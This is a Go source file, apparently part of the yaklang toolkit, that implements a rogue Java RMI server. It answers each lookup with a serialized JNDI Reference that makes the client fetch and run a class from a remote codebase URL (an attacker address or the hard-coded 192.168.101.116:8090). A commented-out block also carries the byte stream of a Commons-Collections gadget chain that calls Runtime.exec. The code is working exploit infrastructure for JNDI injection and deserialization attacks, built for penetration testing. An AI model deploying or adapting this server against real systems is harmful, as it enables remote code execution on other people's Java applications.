package facades

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/jreader"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
	"net"
	"time"
)

var serializationHeader = []byte{0xac, 0xed, 0x00, 0x05}

var help = `
package sun.rmi.transport;

public class TransportConstants {
    /** Transport magic number: "JRMI"*/
    public static final int Magic = 0x4a524d49;
    /** Transport version number */
    public static final short Version = 2;

    /** Connection uses stream protocol */
    public static final byte StreamProtocol = 0x4b;
    /** Protocol for single operation per connection; no ack required */
    public static final byte SingleOpProtocol = 0x4c;
    /** Connection uses multiplex protocol */
    public static final byte MultiplexProtocol = 0x4d;

    /** Ack for transport protocol */
    public static final byte ProtocolAck = 0x4e;
    /** Negative ack for transport protocol (protocol not supported) */
    public static final byte ProtocolNack = 0x4f;

    /** RMI call */
    public static final byte Call = 0x50;
    /** RMI return */
    public static final byte Return = 0x51;
    /** Ping operation */
    public static final byte Ping = 0x52;
    /** Acknowledgment for Ping operation */
    public static final byte PingAck = 0x53;
    /** Acknowledgment for distributed GC */
    public static final byte DGCAck = 0x54;

    /** Normal return (with or without return value) */
    public static final byte NormalReturn = 0x01;
    /** Exceptional return */
    public static final byte ExceptionalReturn = 0x02;
}
`

const rmiMagic uint64 = 0x4a524d49
const (
	rmiConnectionStreamProtocol    = 0x4b
	rmiConnectionSingleOpProtocol  = 0x4c
	rmiConnectionMultiplexProtocol = 0x4d
)

var (
	rmiACK []byte = []byte{0x4e}
)

const (
	rmiCommandCall    byte = 0x50
	rmiCommandReturn  byte = 0x51
	rmiCommandPing    byte = 0x52
	rmiCommandPingACK byte = 0x53
	rmiCommandDGCACK  byte = 0x54
)

const (
	rmiNormalReturn    byte = 0x01
	rmiExceptionReturn byte = 0x02
)

func (f *FacadeServer) rmiShakeHands(peekConn *utils.BufferedPeekableConn) error {
	var conn net.Conn = peekConn
	conn.SetDeadline(time.Now().Add(300 * time.Second))
	reader := conn
	byt := make([]byte, 7)

	_, err := reader.Read(byt)
	if err != nil {
		log.Errorf("read header failed: %s", err)
		return err
	}
	// 初步握手
	headerRaw := byt[:4]
	headerRaw = append(bytes.Repeat([]byte{0x00}, 4), headerRaw...)
	header := binary.BigEndian.Uint64(headerRaw)

	if header != rmiMagic {
		log.Errorf("not a rmi client connection: 0x%08x", header)
		return err
	}

	// 读取版本
	verRaw := byt[4:6]
	verRaw = append(bytes.Repeat([]byte{0x00}, 6), verRaw...)
	ver := binary.BigEndian.Uint64(verRaw)

	log.Infof("rmi client connection from [%s] ver: 0x%02x", conn.RemoteAddr().String(), ver)

	protocol := byt[6]
	//protocolRaw = append(bytes.Repeat([]byte{0x00}, 7), protocolRaw...)
	//protocol := binary.BigEndian.Uint64(protocolRaw)
	//protocol, _ := jreader.ReadByteToInt(reader)
	log.Infof("protocol: 0x%02x", protocol)
	// 读取 Connection 的协议
	flag := protocol

	switch flag {
	case rmiConnectionStreamProtocol:
		log.Infof("%v's protocol: stream", conn.RemoteAddr())
		var buffer bytes.Buffer
		buffer.Write(rmiACK)
		// 写入  SuggestedHost Port
		// UTF + Int(4)
		remoteAddr := f.ConvertRemoteAddr(conn.RemoteAddr().String())
		remoteIP, remotePort, _ := utils.ParseStringToHostPort(remoteAddr)
		buffer.Write(jreader.MarshalUTFString(remoteIP))
		buffer.Write(jreader.IntTo4Bytes(remotePort))
		_, err = conn.Write(buffer.Bytes())
		if err != nil {
			return utils.Errorf("write failed: %s", err)
		}
		log.Infof("server rmi suggested: %v", utils.HostPort(remoteIP, remotePort))
		n, _ := jreader.Read2ByteToInt(conn)
		CIP, _ := jreader.ReadBytesLengthInt(conn, n)
		CPort, _ := jreader.Read4ByteToInt(conn)
		log.Infof("client rmi addr: %v", utils.HostPort(string(CIP), CPort))
		f.triggerNotification("rmi-handshake", peekConn.GetOriginConn(), "", nil)
		//conn.w
	case rmiConnectionSingleOpProtocol:
		log.Infof("%v's protocol: single-op (Unsupported)", conn.RemoteAddr())
	case rmiConnectionMultiplexProtocol:
		log.Infof("%v's protocol: multiplex (Unsupported)", conn.RemoteAddr())
	default:
		log.Infof("%v's protocol: Unsupported protocol", conn.RemoteAddr())
		return utils.Error("Unsupported protocol")
	}
	return nil
}

func (f *FacadeServer) rmiServe(peekConn *utils.BufferedPeekableConn) error {
	var conn net.Conn = peekConn
	//var mirror bytes.Buffer
	//defer func() {
	//	println(codec.EncodeToHex(mirror.Bytes()))
	//}()
	//
	log.Infof("start to handle reader for %v", conn.RemoteAddr())

	//reader := bufio.NewReader(io.TeeReader(conn, &mirror))

	log.Info("start to recv command[byte]")
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	//var buf = make([]byte, 1)
	//_, err := io.ReadAtLeast(conn, buf, 1)
	buf := utils.StableReaderEx(conn, 1*time.Second, 10240)
	//if err != nil {
	//	return utils.Errorf("read rmi command failed: %s", err)
	//}
	//if len(buf) != 1 {
	//	return utils.Errorf("read rmi command failed...")
	//}
	switch buf[0] {
	case rmiCommandCall:
		log.Infof("conn[%s]'s call command received", conn.RemoteAddr())
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		//_, _ = yserx.ParseJavaSerializedFromReader(bufio.NewReader(conn), func(obj yserx.JavaSerializable) {
		//	log.Infof("java-serializable typeof: %v", reflect.TypeOf(obj))
		//	target, _ := obj.(*yserx.JavaString)
		//	if target != nil {
		//		log.Infof("found object: %v", target.Value)
		//		bytesRaw := yserx.MarshalJavaObjects(obj)
		//		f.triggerNotification("rmi", conn, target.Value, []byte(yserx.JavaSerializedDumper(bytesRaw)))
		//		conn.Close()
		//	}
		//})
		objs, err := yserx.ParseJavaSerialized(buf[1:])
		if err != nil {
			return err
		}
		if len(objs) != 2 {
			return utils.Errorf("stub ser error")
		}
		className := string(objs[1].(*yserx.JavaString).Raw)

		respClassS := "aced0005770f01b6a4adc600000181b7af0405800d7372002a636f6d2e73756e2e6a6e64692e726d692e72656769737472792e5265666572656e636557726170706572545a0e2497c2c5f00200014c0007777261707065657400184c6a617661782f6e616d696e672f5265666572656e63653b740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f2374657374787200236a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a65637445091215f5e27e31020003490004706f72744c00036373667400284c6a6176612f726d692f7365727665722f524d49436c69656e74536f636b6574466163746f72793b4c00037373667400284c6a6176612f726d692f7365727665722f524d49536572766572536f636b6574466163746f72793b740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f23746573747872001c6a6176612e726d692e7365727665722e52656d6f7465536572766572c719071268f339fb020000740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f23746573747872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e030000740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f2374657374787077120010556e696361737453657276657252656678000000007070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e000e4c0009636c6173734e616d6571007e000e740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f23746573747870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f237465737478700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f237465737478700000000a707070707070707070707874000474657374740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f2374657374740003466f6f"
		respClass, err := codec.DecodeHex(respClassS)
		if err != nil {
			return err
		}
		//addr := []byte(f.rmiResourceAddrs)

		addr, ok := f.rmiResourceAddrs[className]
		if !ok {
			f.triggerNotificationEx("rmi", peekConn.GetOriginConn(), className, respClass, "<empty>")
			return utils.Errorf("not found class: %s", className)
		}
		respClass = bytes.Replace(respClass, []byte("!http://192.168.101.116:8090/#test"), append(yserx.IntToByte(len(addr)), addr...), -1)
		respClass = bytes.Replace(respClass, []byte("\x04test"), append(yserx.IntToByte(len(className)), className...), -1)
		conn.Write(append([]byte{rmiCommandReturn}, respClass...))
		println(codec.Md5(fmt.Sprintf("%p", peekConn.GetOriginConn())))
		f.triggerNotificationEx("rmi", peekConn.GetOriginConn(), className, respClass, className)
		return nil

		//conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		//// return 表示可以开始服务端读入 input stream 了
		//conn.Write([]byte{rmiCommandReturn})
		//
		//log.Infof("start to write 0xaced!")
		//// 从这里开始写入流 0xaced... XXD
		//_, _ = conn.Write(serializationHeader)
		//
		//// 客户端会接受一个 BLOCKDATA Byte(s) 需要额外发回去，看下客户端如何处理
		//// 假装他是一个正常的 Return
		//conn.Write(jreader.MarshalBlockDataBytes([]byte{rmiNormalReturn}))
		//
		//var buf = bytes.NewBuffer(nil)
		//
		//// 发送 UID (UniqueID:Int(4) Timestamp:Long(8) Count:Short(2))
		//buf.Write(jreader.IntTo4Bytes(rand.Intn(65535)))
		//buf.Write(jreader.Uint64To8Bytes(uint64(time.Now().Unix())))
		//buf.Write(jreader.IntTo2Bytes(1))
		//log.Infof("write to client(UID): %v", codec.EncodeToHex(buf.Bytes()))
		//conn.Write(jreader.MarshalBlockDataByte(buf.Bytes()))
		//buf.Reset()
		//
		////buf.Write([]byte{0x73, 0x72, 0x00, 0x13, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x75, 0x74, 0x69, 0x6c, 0x2e, 0x48, 0x61, 0x73, 0x68, 0x74, 0x61, 0x62, 0x6c, 0x65, 0x13, 0xbb, 0x0f, 0x25, 0x21, 0x4a, 0xe4, 0xb8, 0x03, 0x00, 0x02, 0x46, 0x00, 0x0a, 0x6c, 0x6f, 0x61, 0x64, 0x46, 0x61, 0x63, 0x74, 0x6f, 0x72, 0x49, 0x00, 0x09, 0x74, 0x68, 0x72, 0x65, 0x73, 0x68, 0x6f, 0x6c, 0x64, 0x78, 0x70, 0x3f, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x77, 0x08, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02, 0x73, 0x72, 0x00, 0x2a, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x6d, 0x61, 0x70, 0x2e, 0x4c, 0x61, 0x7a, 0x79, 0x4d, 0x61, 0x70, 0x6e, 0xe5, 0x94, 0x82, 0x9e, 0x79, 0x10, 0x94, 0x03, 0x00, 0x01, 0x4c, 0x00, 0x07, 0x66, 0x61, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x74, 0x00, 0x2c, 0x4c, 0x6f, 0x72, 0x67, 0x2f, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2f, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x3b, 0x78, 0x70, 0x73, 0x72, 0x00, 0x3a, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x6f, 0x72, 0x73, 0x2e, 0x43, 0x68, 0x61, 0x69, 0x6e, 0x65, 0x64, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x30, 0xc7, 0x97, 0xec, 0x28, 0x7a, 0x97, 0x04, 0x02, 0x00, 0x01, 0x5b, 0x00, 0x0d, 0x69, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x73, 0x74, 0x00, 0x2d, 0x5b, 0x4c, 0x6f, 0x72, 0x67, 0x2f, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2f, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2f, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x3b, 0x78, 0x70, 0x75, 0x72, 0x00, 0x2d, 0x5b, 0x4c, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x3b, 0xbd, 0x56, 0x2a, 0xf1, 0xd8, 0x34, 0x18, 0x99, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x05, 0x73, 0x72, 0x00, 0x3b, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x6f, 0x72, 0x73, 0x2e, 0x43, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x58, 0x76, 0x90, 0x11, 0x41, 0x02, 0xb1, 0x94, 0x02, 0x00, 0x01, 0x4c, 0x00, 0x09, 0x69, 0x43, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b, 0x78, 0x70, 0x76, 0x72, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x70, 0x73, 0x72, 0x00, 0x3a, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x73, 0x2e, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x6f, 0x72, 0x73, 0x2e, 0x49, 0x6e, 0x76, 0x6f, 0x6b, 0x65, 0x72, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x6f, 0x72, 0x6d, 0x65, 0x72, 0x87, 0xe8, 0xff, 0x6b, 0x7b, 0x7c, 0xce, 0x38, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x05, 0x69, 0x41, 0x72, 0x67, 0x73, 0x74, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b, 0x4c, 0x00, 0x0b, 0x69, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x4e, 0x61, 0x6d, 0x65, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x5b, 0x00, 0x0b, 0x69, 0x50, 0x61, 0x72, 0x61, 0x6d, 0x54, 0x79, 0x70, 0x65, 0x73, 0x74, 0x00, 0x12, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0x78, 0x70, 0x75, 0x72, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3b, 0x90, 0xce, 0x58, 0x9f, 0x10, 0x73, 0x29, 0x6c, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x02, 0x74, 0x00, 0x0a, 0x67, 0x65, 0x74, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x75, 0x72, 0x00, 0x12, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x3b, 0xab, 0x16, 0xd7, 0xae, 0xcb, 0xcd, 0x5a, 0x99, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x00, 0x74, 0x00, 0x09, 0x67, 0x65, 0x74, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x17, 0x00, 0x00, 0x00, 0x02, 0x76, 0x72, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0xa0, 0xf0, 0xa4, 0x38, 0x7a, 0x3b, 0xb3, 0x42, 0x02, 0x00, 0x00, 0x78, 0x70, 0x76, 0x71, 0x00, 0x7e, 0x00, 0x17, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x0f, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x14, 0x00, 0x00, 0x00, 0x02, 0x70, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x74, 0x00, 0x06, 0x69, 0x6e, 0x76, 0x6f, 0x6b, 0x65, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x17, 0x00, 0x00, 0x00, 0x02, 0x76, 0x72, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x70, 0x76, 0x71, 0x00, 0x7e, 0x00, 0x14, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x0f, 0x75, 0x72, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0xad, 0xd2, 0x56, 0xe7, 0xe9, 0x1d, 0x7b, 0x47, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x01, 0x74, 0x00, 0x08, 0x59, 0x41, 0x4b, 0x49, 0x54, 0x45, 0x58, 0x45, 0x74, 0x00, 0x04, 0x65, 0x78, 0x65, 0x63, 0x75, 0x71, 0x00, 0x7e, 0x00, 0x17, 0x00, 0x00, 0x00, 0x01, 0x71, 0x00, 0x7e, 0x00, 0x1c, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x0a, 0x73, 0x72, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x49, 0x6e, 0x74, 0x65, 0x67, 0x65, 0x72, 0x12, 0xe2, 0xa0, 0xa4, 0xf7, 0x81, 0x87, 0x38, 0x02, 0x00, 0x01, 0x49, 0x00, 0x05, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x78, 0x72, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x6c, 0x61, 0x6e, 0x67, 0x2e, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x86, 0xac, 0x95, 0x1d, 0x0b, 0x94, 0xe0, 0x8b, 0x02, 0x00, 0x00, 0x78, 0x70, 0x00, 0x00, 0x00, 0x01, 0x73, 0x72, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x75, 0x74, 0x69, 0x6c, 0x2e, 0x48, 0x61, 0x73, 0x68, 0x4d, 0x61, 0x70, 0x05, 0x07, 0xda, 0xc1, 0xc3, 0x16, 0x60, 0xd1, 0x03, 0x00, 0x02, 0x46, 0x00, 0x0a, 0x6c, 0x6f, 0x61, 0x64, 0x46, 0x61, 0x63, 0x74, 0x6f, 0x72, 0x49, 0x00, 0x09, 0x74, 0x68, 0x72, 0x65, 0x73, 0x68, 0x6f, 0x6c, 0x64, 0x78, 0x70, 0x3f, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x77, 0x08, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01, 0x74, 0x00, 0x02, 0x79, 0x79, 0x71, 0x00, 0x7e, 0x00, 0x2f, 0x78, 0x78, 0x71, 0x00, 0x7e, 0x00, 0x2f, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x02, 0x71, 0x00, 0x7e, 0x00, 0x07, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x30, 0x3f, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x77, 0x08, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01, 0x74, 0x00, 0x02, 0x7a, 0x5a, 0x71, 0x00, 0x7e, 0x00, 0x2f, 0x78, 0x78, 0x73, 0x71, 0x00, 0x7e, 0x00, 0x2d, 0x00, 0x00, 0x00, 0x02, 0x78})
		//buf.Write(yserx.NewJavaString("TestObject").Marshal())
		////log.Infof("start to write tc_object")
		////raw, _ := codec.DecodeBase64("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEVGVzdHQAA2FhYXg=")
		////objs, _ := yserx.ParseJavaSerialized(raw)
		////if len(objs) > 0 {
		////	log.Infof("write an ordinary hashmap...")
		////	spew.Dump(codec.EncodeToHex(objs[0].Marshal()))
		////	buf.Write(objs[0].Marshal())
		////}
		//
		//conn.Write(buf.Bytes())
		//
		//log.Infof("wait 30s for %s", conn.RemoteAddr())
		//// debug io
		//out, err := utils.ReadConnWithTimeout(conn, 30*time.Second)
		//if err != nil {
		//	log.Errorf("read call failed: %s", err)
		//}
		//
		//log.Infof("read call command: %v", codec.EncodeToHex(out))
		//return utils.Errorf("call not implemented")
	case rmiCommandPing:
		log.Infof("conn[%s]'s ping command received", conn.RemoteAddr())
	case rmiCommandReturn:
		log.Infof("conn[%s]'s return command received", conn.RemoteAddr())
	case rmiCommandPingACK:
		log.Infof("conn[%s]'s ping-ack command received", conn.RemoteAddr())
	case rmiCommandDGCACK:
		log.Infof("conn[%s]'s dgc-ack command received", conn.RemoteAddr())
	}
	return utils.Errorf("not implemented")
}
